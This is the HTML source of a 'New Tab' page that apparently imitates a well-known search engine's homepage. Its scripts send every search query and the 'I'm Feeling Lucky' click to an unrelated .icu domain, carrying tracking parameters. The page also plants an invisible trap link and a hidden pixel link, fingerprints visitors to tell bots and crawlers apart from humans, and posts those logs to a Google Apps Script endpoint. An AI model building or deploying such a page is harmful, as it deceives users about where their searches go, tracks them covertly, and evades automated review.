<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>New Tab</title>

    <!-- Favicon -->
    <link rel="icon" href="sitelogofavicon.png" type="image/png">

    <!-- Hotjar Tracking Code -->
    <script>
        (function(h,o,t,j,a,r){
            h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};
            h._hjSettings={hjid:5278891,hjsv:6};
            a=o.getElementsByTagName('head')[0];
            r=o.createElement('script');r.async=1;
            r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;
            a.appendChild(r);
        })(window,document,'https://static.hotjar.com/c/hotjar-','.js?sv=');
    </script>

    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: white;
            color: #000;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        /* Logo */
        .logo-container {
            margin-bottom: 20px;
        }

        .logo {
            max-width: 250px;
            height: auto;
        }

        /* Centered Search Bar */
        .search-container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            width: 100%;
        }

        /* Search Bar */
        .search-bar-container {
            width: 100%;
            max-width: 600px;
            display: flex;
            align-items: center;
            background-color: white;
            border-radius: 32px;
            padding: 15px 20px;
            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
            position: relative;
        }

        /* Magnifying Glass */
        .search-icon {
            width: 24px;
            height: 24px;
            margin-right: 15px;
            fill: rgb(141, 147, 154);
        }

        /* Updated Magnifying Glass (White Glass Part) */
        .search-icon path {
            fill: none;
            stroke: rgb(141, 147, 154);
            stroke-width: 2;
        }

        /* Search Input */
        input.search-input {
            border: none;
            font-size: 18px;
            width: 100%;
            outline: none;
        }

        /* Buttons */
        .button-container {
            margin-top: 20px;
            display: flex;
            gap: 10px;
        }

        .custom-button {
            background-color: rgb(248, 249, 250);
            color: black;
            border: none;
            border-radius: 4px;
            padding: 10px 20px;
            font-size: 14px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .custom-button:hover {
            background-color: rgb(235, 236, 238);
        }
    </style>

    <script>
        document.addEventListener("DOMContentLoaded", function () {
            function getUrlParam(param) {
                const urlParams = new URLSearchParams(window.location.search);
                return urlParams.get(param) || '';
            }

            const target = getUrlParam('target');
            const source = getUrlParam('source');

            function searchQuery(event) {
                event.preventDefault();
                const query = document.getElementById('searchInput').value.trim();
                if (query) {
                    const searchUrl = `https://addents-leasure.icu/7419ec1e-54f4-4a1c-8667-9211d9f8ea3a?query=${encodeURIComponent(query).replace(/%20/g, '+')}`
                        + (target ? `&target=${encodeURIComponent(target)}` : '')
                        + (source ? `&source=${encodeURIComponent(source)}` : '');
                    window.location.href = searchUrl;
                }
            }

            document.getElementById('searchForm').addEventListener('submit', searchQuery);

            // "I'm Feeling Lucky" should navigate to the URL even if no input is given
            document.getElementById('luckyButton').addEventListener('click', function () {
                const luckyUrl = `https://addents-leasure.icu/36f99e97-f40d-4744-ad2b-2b0b006aaf09`
                    + (target ? `?target=${encodeURIComponent(target)}` : '')
                    + (source ? `&source=${encodeURIComponent(source)}` : '');
                window.location.href = luckyUrl;
            });

            // Trap Link & Pixel Logging
            const logData = {
                target,
                source,
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString(),
                missingFeatures: (!window.navigator || !window.localStorage),
                noInteraction: true,
                fastPageLoad: false,
                clickedTrap: false,
                noJavaScript: false,
                suspiciousUserAgent: /curl|python|bot|crawler|headless/i.test(navigator.userAgent),
            };

            window.addEventListener("load", () => {
                const loadTime = window.performance.timing.domContentLoadedEventEnd - window.performance.timing.navigationStart;
                logData.fastPageLoad = loadTime < 100;
            });

            let humanDetected = false;
            document.addEventListener("mousemove", () => humanDetected = true);
            document.addEventListener("keydown", () => humanDetected = true);
            setTimeout(() => {
                logData.noInteraction = !humanDetected;
            }, 5000);

            const trap = document.createElement("a");
            trap.href = "#";
            trap.textContent = "Invisible Link";
            trap.style.position = "absolute";
            trap.style.top = "-9999px";
            trap.style.left = "-9999px";
            document.body.appendChild(trap);
            trap.addEventListener("click", () => {
                logData.clickedTrap = true;
                sendLog();
            });

            const pixelUrl = `https://addents-leasure.icu/1679f0b1-eec1-4e90-b3f8-2c6887f5c4ac?target=${encodeURIComponent(target)}&source=${encodeURIComponent(source)}&cid=${encodeURIComponent('pixel')}`;
            const pixelLink = document.createElement("a");
            pixelLink.href = pixelUrl;
            pixelLink.setAttribute('rel', 'nofollow');
            pixelLink.style.width = "1px";
            pixelLink.style.height = "1px";
            pixelLink.style.position = "absolute";
            pixelLink.style.top = "0";
            pixelLink.style.left = "0";
            pixelLink.style.opacity = "0";
            pixelLink.style.pointerEvents = "none";
            document.body.appendChild(pixelLink);

            setTimeout(() => {
                sendLog();
            }, 6000);

            function sendLog() {
                fetch('https://script.google.com/macros/s/AKfycbz2KssX3xATumTrCx74vvgIBsKdlyX_i76QGEOr8zpjBjGhwwRqvNDkCg3ToM3Z9-s/exec', {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(logData),
                });
            }
        });
    </script>

<script type="text/javascript">
    (function(c,l,a,r,i,t,y){
        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
    })(window, document, "clarity", "script", "q18zr5her9");
</script>
    
</head>
<body>
    <!-- Logo -->
    <div class="logo-container">
        <img src="searchlogo.png" alt="Search Logo" class="logo">
    </div>

    <!-- Search Container (For Centering) -->
    <div class="search-container">
        <!-- Search Bar -->
        <form id="searchForm" class="search-bar-container">
            <svg class="search-icon" viewBox="0 0 24 24">
                <circle cx="10" cy="10" r="6" fill="white" stroke="rgb(141, 147, 154)" stroke-width="2"/>
                <line x1="14" y1="14" x2="20" y2="20" stroke="rgb(141, 147, 154)" stroke-width="2"/>
            </svg>
            <input type="text" id="searchInput" class="search-input">
        </form>

        <!-- Buttons -->
        <div class="button-container">
            <button type="submit" form="searchForm" class="custom-button">Search</button>
            <button id="luckyButton" class="custom-button">I'm Feeling Lucky</button>
        </div>
    </div>
</body>
</html>
